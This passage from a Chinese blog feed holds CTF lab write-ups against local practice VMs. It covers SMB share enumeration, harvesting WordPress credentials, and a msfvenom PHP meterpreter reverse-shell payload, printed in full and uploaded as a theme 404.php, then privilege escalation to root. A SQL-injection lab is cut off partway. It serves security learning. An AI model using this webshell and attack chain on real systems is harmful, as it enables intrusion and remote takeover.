run</code></pre><p>开始破解，破解之后是自动生成会话，可以使用终端<br><img src="https://img-blog.csdnimg.cn/20200601135332495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>所以使用命令</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200601135513607.png" alt="j4y" loading="lazy"><br>就变成了和平时使用的终端一样了。<br>然后提权<br><img src="https://img-blog.csdnimg.cn/20200601135616324.png" alt="j4y" loading="lazy"><br>到这里进入了root用户<br><img src="https://img-blog.csdnimg.cn/20200601135856302.png" alt="j4y" loading="lazy"><br>然后查找flag，一般是在root目录下，所以直接进入root目录，查看<br>得到flag<br><img src="https://img-blog.csdnimg.cn/20200601140004203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>结束。<br>花了很长时间，学到的东西也很多。继续努力啊。</p><p>文末寄语：</p><blockquote><p>有些乐趣和人生际遇或许我们永远不会有。然而正是在这些“得不到”和“有所得”之间，我们确立了自己在这个世界上的位置。——荞麦</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————SMB信息泄露</title>
      <link href="/posts/cf3b4887/"/>
      <url>/posts/cf3b4887/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CTF靶场系列第三部——利用SMB信息泄漏最终拿到flag</p><h1 id="SMB服务介绍"><a href="#SMB服务介绍" class="headerlink" title="SMB服务介绍"></a>SMB服务介绍</h1><blockquote><p>SMB（Server Message<br>Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。<br>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</p></blockquote><p>emmm，具体的请百度，就不搬运了。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>1、kali攻击机IP：<code>192.168.40.132</code><br>2、靶场IP：<code>192.168.40.146</code><br>目标：拿到靶场中的flag</p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>对于只是给定一个对应lP地址的靶场机器，我们需要用对其进行扫描，探测开放的服务。<br>渗透其实是针对服务的漏洞探测，然后进行对应的数据包发送，获取机器的最高权限</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -sV <span class="token punctuation">[</span>ip<span class="token punctuation">]</span><span class="token comment">#挖掘开放服务信息</span>nmap -A -v -T4 <span class="token punctuation">[</span>ip<span class="token punctuation">]</span><span class="token comment">#挖掘靶场全部信息</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200717110140882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>信息显示开启了<code>139</code>和<code>445</code>端口，mysql也开启了。<br>还有smb的版本信息等。<br>然后第二条命令，扫描靶场全部信息<br><img src="https://img-blog.csdnimg.cn/20200717111412311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="分析探测结果"><a href="#分析探测结果" class="headerlink" title="分析探测结果"></a>分析探测结果</h2><p>每一个服务对应计算机的一个端口，用来进行通信。常用端口<code>0~1023</code>在扫描结果中查找特殊端口<br>老规矩，针对特殊端口进行探测，尤其对开放大端口的http服务进行排查。</p><h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><ol><li>针对SMB协议，使用空口令，弱口令尝试登录，并查看敏感文件，下载查看；</li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell">smbclient <span class="token operator">-</span>L <span class="token namespace">[ip]</span></code></pre><p>列出该IP分享的所有目录以及链接<br><img src="https://img-blog.csdnimg.cn/20200717112451203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里使用的是空密码（直接敲回车即可）‘<br>发现了信息：<code>print$</code>这个是共享的打印机、<code>share$</code>共享一个文件夹、<code>IPC$</code>空链接（不需要用户名就可以登录web服务器）。<br>然后挨个查看就行</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">smbclient <span class="token string">'\\[ip]\print$'</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200717113216834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>依旧使用的空密码，发现是失败了。无法连接。<br>开始下一个<br><img src="https://img-blog.csdnimg.cn/20200717113333429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>依旧空密码，成功连接。可以执行一些命令。比如<code>ls</code><br>然后查看下一个(先全部查看完毕在进行更深一步的探测)<br><img src="https://img-blog.csdnimg.cn/20200717113553126.png" alt="m0re" loading="lazy"><br>同样可以登录到smb服务，可以看到空连接里是没有东西的。直接退出！</p><p>刚才在<code>share$</code>的共享文件夹中发现信息，所以再去到<code>share$</code>中进一步获取信息。<br>使用get下载敏感文件进行查看。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">get deets<span class="token punctuation">.</span>txt </code></pre><p>下载查看<code>deets.txt</code><br><img src="https://img-blog.csdnimg.cn/20200717123635987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>记住这个密码。<br>浏览查看到wordpress文件夹<br><img src="https://img-blog.csdnimg.cn/20200717124516314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到一堆文件，需要找的是它的配置文件，wordpress的配置文件一般是有用户名和密码的。</p><pre class="language-shell" data-language="shell"><code class="language-shell">get wp-config.php</code></pre><p><img src="https://img-blog.csdnimg.cn/20200717150219372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到了MySQL的用户名和密码分别是：<code>Admin</code>和<code>TogieMYSQL12345^^</code><br>之前扫描端口，室友MySQL服务的，在3306端口。所以可以尝试一下远程登录MySQL看看能否成功登录。<br><img src="https://img-blog.csdnimg.cn/20200717150653891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出是无法登录的，所以再另想办法。<br>还有个ssh服务开启，尝试利用ssh服务登录服务器<br><img src="https://img-blog.csdnimg.cn/2020071715104458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>密码还用的是刚才那个，但是无法登录。密码不正确！</p><h2 id="针对SMB协议远程溢出漏洞进行分析"><a href="#针对SMB协议远程溢出漏洞进行分析" class="headerlink" title="针对SMB协议远程溢出漏洞进行分析"></a>针对SMB协议远程溢出漏洞进行分析</h2><pre class="language-shell" data-language="shell"><code class="language-shell">searchsploit samba版本号</code></pre><p><img src="https://img-blog.csdnimg.cn/2020071715144087.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>版本号前面已经查询过了。<br>就是上面这张图显示的，。<br><img src="https://img-blog.csdnimg.cn/20200717151724376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还是没有可利用的信息。</p><h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><ol><li>浏览器查看网站</li><li>使用dirb nikto探测</li><li>寻找突破点，目标登录后台，上传webshell<br><img src="https://img-blog.csdnimg.cn/20200717152327212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>扫差不多就可以停了，向上看，可以看到有wordpress中的<code>wp-admin</code><br>然后尝试访问，在浏览器中访问此链接<code>192.168.40.146/wordpress/wp-admin/</code><br><img src="https://img-blog.csdnimg.cn/20200717152512212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>后台登录页面，还记得刚才得到的用户名和密码吗，就是它<br><img src="https://img-blog.csdnimg.cn/20200717152713787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以成功登录了<br><img src="https://img-blog.csdnimg.cn/2020071715275938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>既然已经登录进去了，就可以上传我们的webshell了。<br>下面制作webshell<h2 id="制作webshell"><a href="#制作webshell" class="headerlink" title="制作webshell"></a>制作webshell</h2>终端执行<pre class="language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>132 lport=4444 <span class="token operator">-</span>f raw</code></pre><img src="https://img-blog.csdnimg.cn/20200717153328145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>记住从注释符后面开始复制，不要将注释符也复制进去</li></ol><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/**/</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'192.168.40.132'</span><span class="token punctuation">;</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'stream_socket_client'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"tcp://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$port</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'socket_create'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span> <span class="token constant">SOCK_STREAM</span><span class="token punctuation">,</span> <span class="token constant">SOL_TCP</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">socket_connect</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'socket'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'no socket funcs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'no socket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token single-quoted-string string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token single-quoted-string string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Nlen"</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token single-quoted-string string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token single-quoted-string string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'suhosin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'suhosin.executor.disable_eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$suhosin_bypass</span><span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$suhosin_bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>在桌面创建一个新文件将内容复制进去就行。<br>命令可使用gedit。由于我的kali没装gedit，所以可以装一下。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> gedit</code></pre><p>开始监听此端口<br>打开metasploit这个工具<br>使用<code>use exploit/multi/handler </code>模块<br>设置payload:<code>set payload php/meterpreter/reverse_tcp</code><br><img src="https://img-blog.csdnimg.cn/20200717160457989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>最后开启本地监听直接<code>run</code></p><h2 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h2><p>使用找到的敏感信息登录系统后台，上传webshell。执行webshell（访问具有webshell的PHP页面）<br>获得反弹的shell<br>wordpress上传点：<code>theme 404.php</code><br>执行：<code>http://靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php</code><br><img src="https://img-blog.csdnimg.cn/20200717161347740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行上传<br><img src="https://img-blog.csdnimg.cn/20200717161520327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>会有提示上传成功的<br><img src="https://img-blog.csdnimg.cn/20200717161554354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后访问一个不存在的页面让其返回404页面。就可以了，上面我已经写到了那个URL，可以访问那个<br><img src="https://img-blog.csdnimg.cn/20200717162132461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个时候应该已经监听到了，回去查看一下<br><img src="https://img-blog.csdnimg.cn/20200717162214246.png" alt="m0re" loading="lazy"><br>可以看到反弹shell已经成功了。<br><img src="https://img-blog.csdnimg.cn/20200717162349130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>还能执行一些命令。</p><h2 id="查找flag信息"><a href="#查找flag信息" class="headerlink" title="查找flag信息"></a>查找flag信息</h2><p>优化终端：<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>查找敏感信息，提升root权限，查看flag值。<br>查看用户名等信息<code>cat /etc/passwd</code><br>找home字眼，找对应的用户进行提权<br><img src="https://img-blog.csdnimg.cn/20200717163347975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>切换<code>togie</code>用户，<code>su - togie</code>需要密码，前面还有个密码，就是在那个deets.txt文件中发现的<code>12345</code><br>然后查看该用户可以执行的权限<code>sudo l</code>，然后看到一些可以执行命令的安全目录<br><img src="https://img-blog.csdnimg.cn/20200717163753494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用<code>sudo su</code>提升到root权限<br>然后就是找flag了。不出意外都在root根目录下<br><img src="https://img-blog.csdnimg.cn/20200717164231641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>只不过我的这个有些奇怪。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里就结束了。总结一下：<br>这个靶场系列主要是信息收集，还有对各个服务的弱点分析。<br>学会了如何制作自己的webshell。利用webshell等一些列知识。<br>还是信息的收集和分析最重要。<br>还有就是对metasploit这个工具更加熟悉了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————POST类型SQL注入利用获取主机root权限</title>
      <link href="/posts/eb8b61ce/"/>
      <url>/posts/eb8b61ce/</url>
      
        <content type="html"><![CDATA[<p>前言：任何一个位置都可能是注入点，比如url中，以及http报文中；</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击机：<code>10.0.2.4</code><br>靶场机器：<code>10.0.2.15</code><br>这个靶场的IP地址啊，我又搞了一天。玩这个真是让人没脾气！<br>由于这个<br><img src="https://img-blog.csdnimg.cn/20200731184052676.png" alt="m0re" loading="lazy"><br>导入到VM里面会出错<img src="https://img-blog.csdnimg.cn/20200813133344391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>所以我安装到了virtual box当中。靶场安装就这个没意外。但是IP地址就有问题了。探测不到，kali是在VM中，之前也遇到过这个问题，已经解决，但是这一次，用以前的方法解决不了了。以前的方法请参考我的博客——🔑<a href="https://blog.csdn.net/qq_45836474/article/details/106460846">https://blog.csdn.net/qq_45836474/article/details/106460846</a><br>这一次用上次的方法不管用了。于是我想起来之前想过弄两台kali，正好这次可以用到，就新安装了一个kali在virtual box上。这个过程也是很艰辛。直接导入虚拟机的，在kali的官网下载镜像包。<a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</a><br>然后就是一个问题了，下载贼慢。<img src="https://img-blog.csdnimg.cn/20200731185550752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>相信大家都有办法。🐶🐶<br>然后问题来了，<br>使用netdiscover扫描不到virtualbox搭建的靶机！这个我找了找，发现有个师傅在社区提这个这个问题，但是没有得到解决。<a href="https://bbs.csdn.net/topics/392861693?list=75554659">使用netdiscover扫描不到virtualbox搭建的靶机！求助</a>我们遇到的问题一模一样。<br>下面我分享一下我的办法。<br>打开主页面顶部的管理——全局设定<br>然后选到网络，就会有这样的界面，点击箭头位置增加一个network<br><img src="https://img-blog.csdnimg.cn/20200731213444136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>点击OK。<br>然后设置kali和靶场机器的网络连接方式<br><img src="https://img-blog.csdnimg.cn/20200731213708553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>选择net网络。下面也选择好刚增加的那一个，同样的靶场机器进行同样的设置。然后再次进行探测。<br><img src="https://img-blog.csdnimg.cn/20200731213944810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>终于看到我想看到的样子了<br><img src="https://img-blog.csdnimg.cn/20200731214048603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h1 id="进行实验"><a href="#进行实验" class="headerlink" title="进行实验"></a>进行实验</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机开放的全部端口</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap -T4 -p- <span class="token number">10.0</span>.2.15</code></pre><p><img src="https://img-blog.csdnimg.cn/2020073121490536.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出靶场开放的端口有三个，<code>80、443、8080</code><br>快速扫描主机的全部信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A -v <span class="token number">10.0</span>.2.15</code></pre><p><img src="https://img-blog.csdnimg.cn/20200731215252259.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看到80端口开启的http服务的版本信息等等<br>然后对80端口的http服务进行敏感信息挖掘<br>使用nikto或者dirb进行探测</p><pre class="language-bash" data-language="bash"><code class="language-bash">nikto -host http://10.0.2.15dirb http://10.0.2.15</code></pre><p><img src="https://img-blog.csdnimg.cn/20200731215920590.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>探测到一些敏感信息，<code>login.php</code>登录界面和<code>phpmyadmin</code><br>访问查看信息，<br><img src="https://img-blog.csdnimg.cn/20200731220321252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>一般还可能会在网页源代码中隐藏一些信息。<br>login.php界面是个登录框，<br><img 